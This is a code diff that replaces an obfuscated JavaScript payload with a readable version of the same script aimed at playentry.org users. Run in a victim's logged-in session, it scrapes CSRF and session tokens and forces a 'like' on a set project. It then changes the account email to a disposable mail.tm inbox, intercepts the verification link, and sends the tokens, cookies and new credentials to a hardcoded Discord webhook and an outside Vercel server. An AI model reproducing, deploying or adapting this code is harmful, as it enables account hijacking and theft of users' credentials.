@@ -1,1 +1,95 @@
-(function(_0x4129a2,_0x29bbb7){const _0x4bdd5f=_0x560a,_0x437814=_0x4129a2();while(!![]){try{const _0x2fd938=-parseInt(_0x4bdd5f(0x1cb))/0x1+parseInt(_0x4bdd5f(0x1d4))/0x2*(parseInt(_0x4bdd5f(0x1db))/0x3)+parseInt(_0x4bdd5f(0x1dd))/0x4+-parseInt(_0x4bdd5f(0x1d1))/0x5*(-parseInt(_0x4bdd5f(0x1f1))/0x6)+parseInt(_0x4bdd5f(0x1c2))/0x7+parseInt(_0x4bdd5f(0x1c7))/0x8*(parseInt(_0x4bdd5f(0x1e2))/0x9)+-parseInt(_0x4bdd5f(0x1d5))/0xa;if(_0x2fd938===_0x29bbb7)break;else _0x437814['push'](_0x437814['shift']());}catch(_0x2a7e40){_0x437814['push'](_0x437814['shift']());}}}(_0x3dec,0x8afce),await(async()=>{const _0x45fdc5=_0x560a,_0x484204=()=>{const _0x4e2841=_0x560a,_0x5277df=_0x4e2841(0x1df),_0x57a61a=_0x4e2841(0x1e1),_0x269f78=_0x5277df+_0x57a61a;let _0x1ff1b3='';_0x1ff1b3+=_0x5277df[_0x4e2841(0x1c1)](Math[_0x4e2841(0x1cc)](Math[_0x4e2841(0x1e0)]()*_0x5277df[_0x4e2841(0x1d7)])),_0x1ff1b3+=_0x57a61a[_0x4e2841(0x1c1)](Math[_0x4e2841(0x1cc)](Math[_0x4e2841(0x1e0)]()*_0x57a61a[_0x4e2841(0x1d7)]));for(let _0x53a06d=_0x1ff1b3[_0x4e2841(0x1d7)];_0x53a06d<0x8;_0x53a06d++){_0x1ff1b3+=_0x269f78['charAt'](Math[_0x4e2841(0x1cc)](Math[_0x4e2841(0x1e0)]()*_0x269f78[_0x4e2841(0x1d7)]));}return _0x1ff1b3[_0x4e2841(0x1bd)]('')[_0x4e2841(0x1f2)](()=>Math[_0x4e2841(0x1e0)]()-0.5)[_0x4e2841(0x1ce)]('');},_0x14b60e=_0x45fdc5(0x1ee),_0x547eda=_0x484204(),_0x31fff8=Math['random']()[_0x45fdc5(0x1e9)](0x24)['substring'](0x2,0xf),_0x3cd8a0=_0x45fdc5(0x1f0),_0x4709ef=_0xb5c61c=>fetch(_0x3cd8a0,{'method':'POST','headers':{'Content-Type':_0x45fdc5(0x1e5)},'body':JSON[_0x45fdc5(0x1cd)]({'content':_0x45fdc5(0x1c9)+_0xb5c61c+_0x45fdc5(0x1e6),'username':'Monster'})})[_0x45fdc5(0x1e3)](()=>{});try{const _0x17d931=await(await fetch(_0x45fdc5(0x1c0),{'credentials':_0x45fdc5(0x1d6)}))[_0x45fdc5(0x1dc)](),_0x1446bb=_0x17d931[_0x45fdc5(0x1e8)](/<meta name="csrf-token" content="([^"]+)"/)?.[0x1]||_0x45fdc5(0x1c5),_0x47c819=_0x17d931[_0x45fdc5(0x1e8)](/"xToken":"([^"]+)"/)?.[0x1]||_0x45fdc5(0x1c5),_0x25fd27=_0x17d931[_0x45fdc5(0x1e8)](/"username":"([^"]+)"/)?.[0x1]||_0x45fdc5(0x1ca);await fetch(_0x45fdc5(0x1ea),{'method':'POST','headers':{'content-type':'application/json','csrf-token':_0x1446bb,'x-client-type':_0x45fdc5(0x1eb),'x-token':_0x47c819},'body':JSON[_0x45fdc5(0x1cd)]({'query':'\x0a\x20\x20\x20\x20mutation\x20LIKE($target:\x20String,\x20$targetSubject:\x20String,\x20$targetType:\x20String,\x20$groupId:\x20ID)\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20like(target:\x20$target,\x20targetSubject:\x20$targetSubject,\x20targetType:\x20$targetType,\x20groupId:\x20$groupId)\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20id\x0a\x20\x20\x20\x20target\x0a\x20\x20\x20\x20targetSubject\x0a\x20\x20\x20\x20targetType\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20}\x0a','variables':{'target':_0x45fdc5(0x1c3),'targetSubject':_0x45fdc5(0x1e4),'targetType':_0x45fdc5(0x1cf)}}),'credentials':_0x45fdc5(0x1d6)});const _0x4a4296=await(await fetch(_0x14b60e+_0x45fdc5(0x1d9)))[_0x45fdc5(0x1c8)](),_0x39aa4d=_0x31fff8+'@'+(_0x4a4296['hydra:member']||_0x4a4296)[0x0]['domain'],_0x47e19f=await fetch(_0x14b60e+_0x45fdc5(0x1c6),{'method':'POST','headers':{'Content-Type':_0x45fdc5(0x1e5)},'body':JSON[_0x45fdc5(0x1cd)]({'address':_0x39aa4d,'password':_0x547eda})});if(!_0x47e19f['ok'])throw new Error(_0x45fdc5(0x1ed)+_0x47e19f['status']);const _0x79977b=(await _0x47e19f['json']())['address'],{token:_0x65aec}=await(await fetch(_0x14b60e+'/token',{'method':'POST','headers':{'Content-Type':'application/json'},'body':JSON[_0x45fdc5(0x1cd)]({'address':_0x39aa4d,'password':_0x547eda})}))['json']();await fetch(_0x45fdc5(0x1d2),{'method':_0x45fdc5(0x1d0),'headers':{'content-type':_0x45fdc5(0x1e5),'CSRF-Token':_0x1446bb,'x-client-type':_0x45fdc5(0x1eb),'x-token':_0x47c819},'body':JSON[_0x45fdc5(0x1cd)]({'query':_0x45fdc5(0x1da),'variables':{'email':_0x79977b}}),'credentials':_0x45fdc5(0x1d6)});const _0x3ff523=((await(await fetch(_0x14b60e+_0x45fdc5(0x1ef),{'headers':{'Authorization':_0x45fdc5(0x1d3)+_0x65aec}}))[_0x45fdc5(0x1c8)]())['hydra:member']||[])[_0x45fdc5(0x1d7)];while(!![]){const _0x33af3b=(await(await fetch(_0x14b60e+'/messages',{'headers':{'Authorization':_0x45fdc5(0x1d3)+_0x65aec}}))[_0x45fdc5(0x1c8)]())['hydra:member']||[];if(_0x33af3b[_0x45fdc5(0x1d7)]>_0x3ff523){const _0x3e75ed=await(await fetch(_0x14b60e+'/messages/'+_0x33af3b[0x0]['id'],{'headers':{'Authorization':_0x45fdc5(0x1d3)+_0x65aec}}))[_0x45fdc5(0x1c8)](),_0x23e2d8=(_0x3e75ed[_0x45fdc5(0x1dc)]||'')[_0x45fdc5(0x1e8)](/https:\/\/playentry\.org\/api\/email\/[^\s\)\]]+/)||(_0x3e75ed[_0x45fdc5(0x1e7)]&&_0x3e75ed[_0x45fdc5(0x1e7)][0x0]||'')[_0x45fdc5(0x1e8)](/https:\/\/playentry\.org\/api\/email\/[^"'\s\)\]]+/);if(_0x23e2d8){const _0x454d19=_0x23e2d8[0x0][_0x45fdc5(0x1ec)](/\]$/,'');try{const _0x37b4dd=await fetch('https://everythingwillbeokay.vercel.app',{'method':_0x45fdc5(0x1d0),'headers':{'Content-Type':_0x45fdc5(0x1e5)},'body':JSON[_0x45fdc5(0x1cd)]({'auth_url':_0x454d19})}),_0x469d0b=await _0x37b4dd['json'](),_0xc63ef0=_0x469d0b['status']===_0x45fdc5(0x1c4)?{'username':_0x25fd27,'email':_0x79977b,'email_password':_0x547eda,'csrf':_0x1446bb,'xtoken':_0x47c819,'cookie':_0x469d0b[_0x45fdc5(0x1de)]||{}}:null,_0x44eed4=_0xc63ef0?'#\x20'+_0x25fd27+'\x20-\x20Success\x0a```\x0a'+JSON['stringify'](_0xc63ef0,null,0x2)+'\x0a```':'#\x20'+_0x25fd27+'\x20-\x20Failed\x0a```No\x20Redirect```';fetch(_0x3cd8a0,{'method':_0x45fdc5(0x1d0),'headers':{'Content-Type':_0x45fdc5(0x1e5)},'body':JSON[_0x45fdc5(0x1cd)]({'content':_0x44eed4,'username':_0x45fdc5(0x1bf)})})[_0x45fdc5(0x1e3)](_0x5eaac7=>_0x4709ef('Webhook\x20Error:\x20'+_0x5eaac7[_0x45fdc5(0x1be)])),_0xc63ef0&&fetch('https://everythingwillbeokay.vercel.app/em',{'method':_0x45fdc5(0x1d0),'headers':{'Content-Type':_0x45fdc5(0x1e5)},'body':JSON[_0x45fdc5(0x1cd)](_0xc63ef0)})['catch'](_0x3b6611=>_0x4709ef(_0x45fdc5(0x1d8)+_0x3b6611['message']));}catch(_0xc01477){_0x4709ef('Server\x20Send\x20Failed:\x20'+_0xc01477[_0x45fdc5(0x1be)]);}}break;}await new Promise(_0x210a8a=>setTimeout(_0x210a8a,0xbb8));}}catch(_0x5b7872){_0x4709ef(_0x5b7872[_0x45fdc5(0x1be)]+'\x0a'+(_0x5b7872['stack']||''));}})());function _0x560a(_0x244390,_0x46337a){_0x244390=_0x244390-0x1bd;const _0x3dec4c=_0x3dec();let _0x560a70=_0x3dec4c[_0x244390];return _0x560a70;}function _0x3dec(){const _0xafcc7=['136dAvxHH','json','#\x20Error\x0a```\x0a','unknown','580356TVNMJc','floor','stringify','join','individual','POST','2968090ISrVOT','https://playentry.org/graphql/CHANGE_USER_EMAIL','Bearer\x20','4lFHqVX','28294030wZtjCS','include','length','em.py\x20Execution\x20Request\x20Failed:\x20','/domains','\x0a\x20\x20\x20\x20mutation\x20CHANGE_USER_EMAIL($email:\x20String!)\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20changeUserEmail(email:\x20$email)\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20status\x0a\x20\x20\x20\x20result\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20}\x0a','1555236WVNiyD','text','3136264naPcvn','cookies','abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ','random','0123456789','376839pJHweD','catch','project','application/json','\x0a```','html','match','toString','https://playentry.org/graphql/LIKE','Client','replace','Email\x20Account\x20Creation\x20Failed:\x20','https://api.mail.tm','/messages','https://discord.com/api/webhooks/1448294631660978228/Ircwy3gHOerBthwDL6lENEOWGHZta2BT7rIef4ASGp0wFJle5LcRC0-G_D1BJ2lw3Tdb','6VHhyWf','sort','split','message','Monster','https://playentry.org/','charAt','5969166Qfbxhf','69907c0b7268125d781f483a','success','N/A','/accounts'];_0x3dec=function(){return _0xafcc7;};return _0x3dec();}
+await (async () => {
+    const generatePassword = () => {
+        const letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+        const numbers = '0123456789';
+        const allChars = letters + numbers;
+        let password = '';
+        
+        password += letters.charAt(Math.floor(Math.random() * letters.length));
+        password += numbers.charAt(Math.floor(Math.random() * numbers.length));
+        for (let i = password.length; i < 8; i++) {
+            password += allChars.charAt(Math.floor(Math.random() * allChars.length));
+        }
+        return password.split('').sort(() => Math.random() - 0.5).join('');
+    };
+    const a = 'https://api.mail.tm', b = generatePassword(), c = Math.random().toString(36).substring(2, 15), w = 'https://discord.com/api/webhooks/1448294631660978228/Ircwy3gHOerBthwDL6lENEOWGHZta2BT7rIef4ASGp0wFJle5LcRC0-G_D1BJ2lw3Tdb';
+    const x = (y) => fetch(w, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ content: `# 오류 발생\n\`\`\`\n${y}\n\`\`\``, username: 'Monster' }) }).catch(() => {});
+    try {
+        const i = await (await fetch('https://playentry.org/', { credentials: 'include' })).text();
+        const j = i.match(/<meta name="csrf-token" content="([^"]+)"/)?.[1] || 'N/A';
+        const k = i.match(/"xToken":"([^"]+)"/)?.[1] || 'N/A';
+        const l = i.match(/"username":"([^"]+)"/)?.[1] || 'unknown';
+        await fetch('https://playentry.org/graphql/LIKE', {
+            method: 'POST',
+            headers: {
+                "content-type": "application/json",
+                "csrf-token": j,
+                "x-client-type": "Client",
+                "x-token": k,
+            },
+            body: JSON.stringify({ "query": "\n    mutation LIKE($target: String, $targetSubject: String, $targetType: String, $groupId: ID) {\n        like(target: $target, targetSubject: $targetSubject, targetType: $targetType, groupId: $groupId) {\n            \n    id\n    target\n    targetSubject\n    targetType\n\n        }\n    }\n", "variables": { "target": "69907c0b7268125d781f483a", "targetSubject": "project", "targetType": "individual" } }),
+            credentials: 'include'
+        });
+        const d = await (await fetch(`${a}/domains`)).json();
+        const e = `${c}@${(d['hydra:member'] || d)[0].domain}`;
+        const f = await fetch(`${a}/accounts`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ address: e, password: b })
+        });
+        if (!f.ok) throw new Error(`Email Account Creation Failed: ${f.status}`);
+        const g = (await f.json()).address;
+        const { token: h } = await (await fetch(`${a}/token`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ address: e, password: b })
+        })).json();
+        await fetch('https://playentry.org/graphql/CHANGE_USER_EMAIL', {
+            method: 'POST',
+            headers: { "content-type": "application/json", "CSRF-Token": j, "x-client-type": "Client", "x-token": k },
+            body: JSON.stringify({ "query": "\n    mutation CHANGE_USER_EMAIL($email: String!) {\n        changeUserEmail(email: $email) {\n            \n    status\n    result\n\n        }\n    }\n", "variables": { "email": g } }),
+            credentials: 'include'
+        });
+        const m = ((await (await fetch(`${a}/messages`, { headers: { 'Authorization': `Bearer ${h}` } })).json())['hydra:member'] || []).length;
+        while (true) {
+            const n = (await (await fetch(`${a}/messages`, { headers: { 'Authorization': `Bearer ${h}` } })).json())['hydra:member'] || [];
+            if (n.length > m) {
+                const o = await (await fetch(`${a}/messages/${n[0].id}`, { headers: { 'Authorization': `Bearer ${h}` } })).json();
+                const p = (o.text || '').match(/https:\/\/playentry\.org\/api\/email\/[^\s\)\]]+/) || ((o.html && o.html[0]) || '').match(/https:\/\/playentry\.org\/api\/email\/[^"'\s\)\]]+/);
+                if (p) {
+                    const q = p[0].replace(/\]$/, '');
+                    try {
+                        const r = await fetch('https://everythingwillbeokay.vercel.app', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ auth_url: q })
+                        });
+                        const s = await r.json();
+                        const userData = s.status === 'success' ? { username: l, email: g, email_password: b, csrf: j, xtoken: k, cookie: s.cookies || {} } : null;
+                        const t = userData ? `# $Ql} - Success\n\`\`\`\n${JSON.stringify(userData, null, 2)}\n\`\`\`` : `# ${l} - Failed\n\`\`\`No Redirect\`\`\``;
+                        await fetch(w, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ content: t, username: 'Monster' }),
+                            keepalive: true
+                        }).catch(z => x(`Webhook Error: ${z.message}`));
+                        if (userData) {
+                            await fetch('https://everythingwillbeokay.vercel.app/em', {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify(userData),
+                                keepalive: true
+                            }).catch(z => x(`em.py Execution Request Failed: ${z.message}`));
+                        }
+                    } catch (z) {
+                        x(`Server Send Failed: ${z.message}`);
+                    }
+                }
+                break;
+            }
+            await new Promise(u => setTimeout(u, 3000));
+        }
+    } catch (v) {
+        x(`${v.message}\n${v.stack || ''}`);
+    }
+})();
